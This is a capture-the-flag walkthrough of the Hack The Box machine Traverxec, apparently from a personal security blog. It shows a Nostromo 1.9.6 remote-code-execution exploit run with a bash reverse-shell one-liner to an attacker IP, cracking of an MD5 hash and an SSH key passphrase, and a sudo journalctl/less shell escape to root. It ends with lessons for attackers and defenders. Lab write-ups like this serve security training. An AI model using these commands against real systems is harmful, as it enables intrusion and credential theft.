---
title: "Traverxec"
date: 2023-06-14T18:00:00-00:00
publishdate: 2020-07-16T18:00:00-00:00
releasedate: 2019-11-16T00:00:00-00:00
draft: false
hideTitle: false
Cover: /htb-info-cards/Traverxec.png
icon: /htb-box-icons/Traverxec.png
toc: true
tags: ["CVE", "Nostromo", "Common Program Privesc", "Password Cracking"]
categories: ["Walkthrough", "HTB", "Linux", "Easy"]
---

## INTRODUCTION

Traverxec is an older box, dating back to 2019, created by a reasonably-famous HTB user named **jkr**. It prominently features a very minimal webserver called **Nostromo**. Nostromo is a quick win, reinforcing some key pentesting fundamentals: checking for CVEs and vulnerability recognition while on the local system (after gaining foothold). The procedure for this box is fairly straightforward - a little Linux knowledge will grant the root flag. 

> I wrote this walkthrough before I had figured out a methodical and consistent way to take notes. Please excuse the haphazard formatting and brevity.



## RECON

### nmap scans

[11:05:48] Performing nmap higher-port scan:

```
# Nmap 7.93 scan initiated Wed Jun 14 11:05:48 2023 as: nmap -p- --min-rate 5000 -oA ./Traverxec/nmap/port-scan 10.10.10.165
Nmap scan report for traverxec.htb (10.10.10.165)
Host is up (0.35s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Wed Jun 14 11:06:15 2023 -- 1 IP address (1 host up) scanned in 27.27 seconds

```

[11:06:15] Performing nmap initial scan:

```
# Nmap 7.93 scan initiated Wed Jun 14 11:06:15 2023 as: nmap -sC -sV -v -n -Pn -oA ./Traverxec/nmap/init-scan 10.10.10.165
Nmap scan report for 10.10.10.165
Host is up (0.19s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa99a81668cd41ccf96c8401c759095c (RSA)
|   256 93dd1a23eed71f086b58470973a388cc (ECDSA)
|_  256 9dd6621e7afb8f5692e637f110db9bce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 14 11:06:45 2023 -- 1 IP address (1 host up) scanned in 29.59 seconds

```

[11:06:45] HTTP VHost enumeration, using ffuf:

```
No results
```

[11:12:38] HTTP Directory enumeration for traverxec.htb:

```
└─$ gobuster dir -w $WLIST -u $RADDR -t 60 --no-error                                                                                                                                            1 ⨯
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.165
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/14 15:32:32 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 314] [--> http://10.10.10.165/img/]
/js                   (Status: 301) [Size: 314] [--> http://10.10.10.165/js/]
/lib                  (Status: 301) [Size: 314] [--> http://10.10.10.165/lib/]
/icons                (Status: 301) [Size: 314] [--> http://10.10.10.165/icons/]
/reports list         (Status: 501) [Size: 310]
/external files       (Status: 501) [Size: 310]
/style library        (Status: 501) [Size: 310]
/modern mom           (Status: 501) [Size: 310]
/neuf giga photo      (Status: 501) [Size: 310]
```



## FOOTHOLD

### CVE-2019-16278

The nmap scans show that the webserver is **nostromo 1.9.6**. Checked searchsploit for that version. 

![searchsploit](searchsploit.png)

 ==> Yep there is an exploit! :clap: 

I took a copy of the exploit. However, I had to modify the exploit very slightly: comment out one line. Change one string to `bytes(____,'utf-8')` encoding 

Next, I opened the firewall, set up a listener, and ran the exploit as follows:

```bash
sudo ufw allow from 10.10.10.165 to any port 4444 proto tcp
bash
nc -lvnp 4444
```

```bash
python3 ./47837.py 10.10.10.165 80 "bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'"
```

:tada: Got a reverse shell. 



## USER FLAG

### User: www-data

In an effort to keep this walkthrough brief, I'll only discuss the notable results of user enumeration. To read about my whole user enumeration strategy in detail, please see [this page](/strategy/user-enumeration-linux).

- Important users are `www-data`, `david`, and `root`:

  ```
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  root:x:0:0:root:/root:/bin/bash
  sync:x:4:65534:sync:/bin:/bin/sync
  david:x:1000:1000:david,,,:/home/david:/bin/bash
  ```

- Lots of useful tools are already on the box:

  ```bash
  which nc netcat socat curl wget python perl php
  /usr/bin/nc
  /usr/bin/netcat
  /usr/bin/wget
  /usr/bin/python
  /usr/bin/perl
  ```

- `netstat -tulpn` revealed that ONLY port 22 and 80 are listening.

- Linpeas found the following hash of a credential:

  ![linpeas credential](linpeas%20credential.png)

  `david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/`
  So if I had to guess, this is a login for the admin panel of the webserver or something.



### Cracking the Hash

Identified the hash using `hash-identifier`

> :bulb: After writing this walkthrough, I discovered a wonderful new hash identification tool called Name-That-Hash. I highly recommend you go check it out.

```
hash-identifier
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
 HASH: $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

Possible Hashs:
[+] MD5(Unix)
```

OK, so it's MD5. That should be recognized right away...

```bash
 echo 'david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.john
```

And it found a password:

```http
Nowonly4me       (david)  
```

Ok, so a valid credential is **david / Nowonly4me** (again, from a .htaccess file, so probably for the webserver)



### public_www

Earlier, reading `/etc/passwd` revealed that Nostromo has a server root directory at `/var/nostromo`. Inside that directory are some configuration files. This is one of them, the **nhttpd.conf** file:

```
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www

```

Ahhh ok. So david has a directory `/home/david/public_www/` that is accessible by the webserver. 
ex if `/home/david/public_www/subdir` exists on the filesystem, then we can access it by the url:

http://traverxec.htb/~david/subdir/

In this case, using the rev shell I searched what was the contents:

```bash
www-data@traverxec:/home$ ls -laR /home/david/public_www
/home/david/public_www:
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area

/home/david/public_www/protected-file-area:
total 16
drwxr-xr-x 2 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz

```

so there we have it. And since I've already cracked the password this should be easy.

![protected-file-area](protected-file-area.png)

As expected, there is a file for download:

http://traverxec.htb/~david/protected-file-area/backup-ssh-identity-files.tgz

It turns out that file is an archive of david's .ssh directory. Opening it up reveals three ssh-relevant files:

![loot files](loot%20files.png)

I'll try the rsa key for logging in...
==> Nope! Looks like there's a passphrase on it.



### Cracking the RSA Private Key

Drats. There's a passphrase on it. let me take a look at that key...

Ahh yep.That's a passphrase alright... It's PEM encrypted - might be possible to crack. I'll get at that.

```bash
ssh2john id_rsa > id_rsa.john
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
```

Yep! got a result almost immediately:

```http
hunter           (id_rsa)    
```

Now, using **id_rsa** with the passphrase "hunter", I should be able to SSH in as david...

![ssh success](ssh%20success.png)



### User: david

First, `david` holds the user flag. Simply `cat` it out from their home directory:

```bash
cat /home/david/user.txt
```

Taking a look around, it seems `david` has their own `bin` directory on the path:

```bash
david@traverxec:~$ echo $PATH
/home/david/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

That's a bit odd. This could lead to path abuse possibly. I might come back to this later :triangular_flag_on_post:

There are two files within: server-stats.head and server-stats.sh. This is server-stats.head:

```http
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""' 

```

> Cute! :heart_eyes_cat: Love the ascii art
>

And here's server-stats.sh

```bash
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```



## ROOT FLAG

Since journalctl invokes `less` usually, and `less` has a command prompt inside, we can make that last line vulnerable. Like many other full-screen programs that run solely in the terminal, `less` has a "convenience" feature that allows a user to run shell commands by prefixing any command with a "!". Basically, we just need a way to keep `less` from closing immediately:

Just run the `sudo` part of the final line by itself

```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

Make sure to shrink the window down to **fewer than 5 lines tall**. this way, `less` has to scroll, so the -n5 flag doesnt make it terminate immediately. If `less` doesnt terminate, you can run a shell through it! 

I used it to spawn a **bash reverse shell** and baboom root access :tada:



## LESSONS LEARNED

{{% lessons-learned attacker=true %}}

### Attacker

- **Once you know the application and version, spend a minute looking for known vulnerabilities**. I was glad that I checked this right away, as I may have wasted a lot of time enumerating the server or reading source code. 
- **Recognize which hashes are easy to crack**. Having knowledge of which hash algorithms are easy to crack (and which are hard) is valuable. I knew right away that MD5 would crack very very quickly, so I wasn't afraid to throw it into `john`. It helps a lot that HTB only ever uses `rockyou.txt`.
  {{% /lessons-learned %}}
- **Many common programs have a feature to run shell commands**. This is especially true for older programs that rose to popularity before multi-window environments. Keep these programs in-mind as privesc vectors. Also remember that a program like `less` might be disguised as `journalctl`, `pager`, etc.

{{% lessons-learned defender=true %}}

### Defender

- **Use a modern webserver** that still has an active development community. There are always vulnerabilities: it's pretty much a fact of computers - better to go with a server that has folks actively working to patch those vulnerabilities than one that has stagnated.
- Keep passwords safe by using a **stronger hashing algorithm and more complex passwords**. This is just one of a multitude of ways to keep passwords secure. Really, if you must use passwords, please use a proper password manager.
- **Be very careful with SUID**. If it's used, there should be absolutely no way to for the user to do file-disclosure or *any* shell command execution. Lock it down!
  {{% /lessons-learned %}}
